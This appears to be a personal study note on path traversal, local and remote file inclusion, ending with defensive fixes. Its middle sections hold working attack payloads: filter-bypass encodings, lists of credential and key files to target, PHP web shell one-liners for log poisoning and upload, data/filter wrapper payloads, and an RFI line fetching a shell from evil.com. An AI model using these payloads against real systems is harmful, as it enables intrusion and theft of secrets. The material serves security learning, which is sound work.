# Path Traversal / LFI / RFI
Tags: #vulnerability #path-traversal #lfi #rfi #file-inclusion #day5

## What are path traversal, LFI, and RFI — and how do they differ?

Three related but distinct vulnerabilities, escalating in severity:

**Path Traversal** — manipulating file paths to read or write files outside the intended directory. `../../etc/passwd` instead of `photo.jpg`. The file is read or written but **not executed**. Impact: information disclosure, arbitrary file write.

**LFI (Local File Inclusion)** — the application includes and **executes** a file from the local server. PHP's `include()` or `require()` takes a filename and runs it as code. If the attacker controls the filename, they can make the application execute a file already on the server — like a log file they've injected code into. Key difference from path traversal: the file gets **executed**, not just read.

**RFI (Remote File Inclusion)** — same as LFI but the attacker points to a file on **their own server**. The application fetches and executes `http://evil.com/shell.php`. Attacker hosts the payload, application downloads and runs it. Instant RCE.

| Type | Action | Impact |
|---|---|---|
| Path Traversal | Read/write files | Information disclosure, arbitrary write |
| LFI | Execute local files | Code execution (if attacker controls file contents) |
| RFI | Execute remote files | Immediate RCE — attacker hosts the payload |

## What application features are vulnerable?

Any feature where a filename or path comes from user input:

- File download endpoints — `/api/download?file=report.pdf`
- File upload — attacker controls the stored filename or path
- Template/theme selection — `/page?template=summer`
- Language/locale loading — `/page?lang=en` loads `locales/en.json`
- Log viewers — admin panels displaying log files by name
- Avatar/profile picture serving — `/images?name=user_photo.jpg`
- Document viewers — `/view?doc=invoice.pdf`

## How does `../` work and how many does the attacker need?

`../` means "go up one directory." The attacker doesn't need to know exactly how deep they are — extra `../` just hit the filesystem root and stay there. `../../../../../../../../etc/passwd` works even if the app is only 3 directories deep. Stack more than necessary and you always reach root.

## What bypass techniques exist when `../` is filtered?

**Encoding:**

| Technique | Payload |
|---|---|
| URL encoding | `%2e%2e%2f` |
| Double URL encoding | `%252e%252e%252f` |
| Overlong UTF-8 | `..%c0%af` |
| Unicode encoding | `..%ef%bc%8f` |

**Alternate representations:**

| Technique | Payload |
|---|---|
| Mixed separators | `..\/ ` |
| Doubled characters | `....//` (filter strips `../` once, leaves `../`) |
| Windows backslash | `..\` |
| Tomcat path parameter | `..;/` |

**Null byte (older systems):**

```
../../etc/passwd%00.jpg
```

Application checks "ends in `.jpg`?" — yes. But `%00` terminates the string at the OS level, so the filesystem opens `/etc/passwd`. Mostly patched in modern languages but still appears in older PHP and Java.

## What high-value files does an attacker target?

**Linux:**

| Path | Value |
|---|---|
| `/etc/passwd` | User enumeration |
| `/etc/shadow` | Password hashes (rarely readable) |
| `/proc/self/environ` | Environment variables, may contain secrets |
| `/proc/self/cmdline` | How the process was started |
| `/home/user/.ssh/id_rsa` | SSH private keys |
| `/home/user/.bash_history` | Command history |
| `/var/log/apache2/access.log` | Log files (useful for LFI log poisoning) |
| `/etc/nginx/nginx.conf` | Server configuration |

**Windows:**

| Path | Value |
|---|---|
| `C:\Windows\win.ini` | Confirms Windows traversal works |
| `C:\inetpub\wwwroot\web.config` | ASP.NET config, connection strings |
| `C:\Users\Administrator\.ssh\id_rsa` | SSH keys |

**Application-specific:**

`config.php`, `.env`, `settings.py` (database credentials, API keys), `/WEB-INF/web.xml` (Java app config), `package.json`, `requirements.txt` (dependency information).

## How do you escalate LFI to RCE?

Path traversal reads files. LFI executes them. The attacker needs to get their code into a file on the server, then include it.

**1. File upload.** Upload `shell.jpg` containing `<?php system($_GET['cmd']); ?>`. Server stores it at `/uploads/shell.jpg`. Include it: `?page=../../uploads/shell.jpg`. PHP doesn't care about the extension — `include()` executes whatever code is inside.

**2. Log poisoning.** Send a request with malicious User-Agent:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

Apache logs this to `/var/log/apache2/access.log`. Include the log: `?page=../../var/log/apache2/access.log&cmd=whoami`. Same works with SSH auth logs — SSH login with username `<?php system('whoami'); ?>`, it gets written to `/var/log/auth.log`.

**3. PHP session files.** If the attacker controls any value stored in their session (username, preference), it's written to `/tmp/sess_<session_id>`. Inject PHP code as your username, then include: `?page=../../tmp/sess_abc123def456`.

**4. `/proc/self/environ`.** Contains environment variables including `HTTP_USER_AGENT`. Send PHP code in the User-Agent header, then include: `?page=../../proc/self/environ`.

**5. PHP filter wrapper — source code reading.** Even without code execution:

```
?page=php://filter/convert.base64-encode/resource=config
```

Base64-encodes the file instead of executing it. Decode to get source code — database credentials, API keys, logic that reveals more vulnerabilities.

**6. Data wrapper — direct RCE without any file.**

```
?page=data://text/plain,<?php system('whoami'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

No log poisoning, no upload — code injected directly through the wrapper.

## When does RFI work?

```
?page=http://evil.com/shell.php
```

Server fetches and executes the attacker's file directly. Zero effort RCE. But it requires:

- PHP's `allow_url_include = On` (disabled by default in modern PHP)
- `include()` / `require()` used with user input
- No allowlist restricting includable files

## How do you fix path traversal and file inclusion?

**1. Allowlist mapping — never use user input in file paths directly.**

```python
# Vulnerable
open("/templates/" + user_input)

# Safe — indirect reference
PAGES = {'home': 'home.html', 'about': 'about.html'}
file = PAGES.get(user_input)
if file:
    open("/templates/" + file)
```

**2. Canonicalize and validate.** Resolve the full path and confirm it's within the intended directory:

```python
base = "/var/www/uploads/"
requested = os.path.realpath(os.path.join(base, user_input))
if not requested.startswith(base):
    abort(403)
```

**3. PHP-specific hardening:**
- `allow_url_include = Off` — blocks RFI
- `open_basedir` — restricts which directories PHP can access
- Don't use `include()` with user input at all

**4. Principle of least privilege.** Run the web server as a low-privilege user. Even if traversal works, sensitive files like `/etc/shadow` aren't readable. Chroot jails restrict a process to a specific directory tree — the process can't traverse above its root.

## My Notes
